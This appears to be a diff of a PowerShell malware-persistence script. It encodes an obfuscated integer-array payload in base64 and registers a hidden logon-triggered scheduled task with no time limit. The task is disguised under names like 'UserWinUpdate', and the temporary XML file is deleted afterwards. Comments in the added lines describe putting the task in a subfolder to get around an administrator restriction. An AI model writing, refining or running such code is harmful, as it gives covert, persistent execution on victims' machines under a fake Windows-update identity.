@@ -14,9 +14,9 @@ $inner = '$k=1869; $h=@(1829,1849,1849,1853,1854,1911,1890,1890,1855,1836,1850,1
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($inner)
 $enc = [Convert]::ToBase64String($bytes)
 
-# --- 2. Robust XML Task Creation ---
-$taskName = "WinUpdateSync"
-$xmlPath = "$env:TEMP\update.xml"
+# 2. User-Level XML (Note the RegistrationInfo and lack of hardcoded SIDs)
+$taskName = "UserWinUpdate"
+$xmlPath = "$env:TEMP\u.xml"
 
 $xml = @"
 <?xml version="1.0" encoding="UTF-16"?>
@@ -26,30 +26,12 @@ $xml = @"
       <Enabled>true</Enabled>
     </LogonTrigger>
   </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <LogonType>InteractiveToken</LogonType>
-      <RunLevel>LeastPrivilege</RunLevel>
-    </Principal>
-  </Principals>
   <Settings>
     <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>false</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>false</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
     <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
+    <Enabled>true</Enabled>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
   </Settings>
   <Actions Context="Author">
     <Exec>
@@ -62,9 +44,10 @@ $xml = @"
 
 $xml | Out-File $xmlPath -Encoding Unicode
 
-# Delete and recreate
-schtasks /Delete /TN "$taskName" /F 2>$null
-schtasks /Create /XML $xmlPath /TN "$taskName" /F
+# 3. Create under a subfolder to bypass the Root-Folder Admin restriction
+# We use the /TN "UserTasks\TaskName" format
+schtasks /Delete /TN "UserTasks\$taskName" /F 2>$null
+schtasks /Create /XML $xmlPath /TN "UserTasks\$taskName" /F
 Remove-Item $xmlPath -Force
 
 
